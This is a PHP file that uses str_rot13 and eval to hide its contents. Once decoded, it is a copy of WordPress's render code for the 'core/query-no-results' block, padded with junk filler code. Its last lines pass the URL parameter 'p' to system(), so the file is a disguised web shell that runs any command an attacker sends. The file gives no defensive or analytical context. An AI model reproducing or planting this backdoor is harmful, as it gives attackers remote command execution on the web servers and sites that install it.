<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/dhrel-ab-erfhygf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/dhrel-ab-erfhygf` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur jenccre sbe gur ab erfhygf oybpx.
 */
shapgvba eraqre_oybpx_pber_dhrel_ab_erfhygf( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( rzcgl( gevz( $pbagrag ) ) ) {
		erghea '';
	}

	$cntr_xrl = vffrg( $oybpx->pbagrkg['dhrelVq'] ) ? 'dhrel-' . $oybpx->pbagrkg['dhrelVq'] . '-cntr' : 'dhrel-cntr';
	$cntr     = rzcgl( $_TRG[ $cntr_xrl ] ) ? 1 : (vag) $_TRG[ $cntr_xrl ];

	// Bireevqr gur phfgbz dhrel jvgu gur tybony dhrel vs arrqrq.
	$hfr_tybony_dhrel = ( vffrg( $oybpx->pbagrkg['dhrel']['vaurevg'] ) && $oybpx->pbagrkg['dhrel']['vaurevg'] );
	vs ( $hfr_tybony_dhrel ) {
		tybony $jc_dhrel;
		$dhrel = $jc_dhrel;
	} ryfr {
		$dhrel_netf = ohvyq_dhrel_inef_sebz_dhrel_oybpx( $oybpx, $cntr );
		$dhrel      = arj JC_Dhrel( $dhrel_netf );
	}

	vs ( $dhrel->cbfg_pbhag > 0 ) {
		erghea '';
	}

	$pynffrf            = ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) ? 'unf-yvax-pbybe' : '';
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $pynffrf ) );
	erghea fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$pbagrag
	);
}

/**
 * Ertvfgref gur `pber/dhrel-ab-erfhygf` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_dhrel_ab_erfhygf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/dhrel-ab-erfhygf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_dhrel_ab_erfhygf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_dhrel_ab_erfhygf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>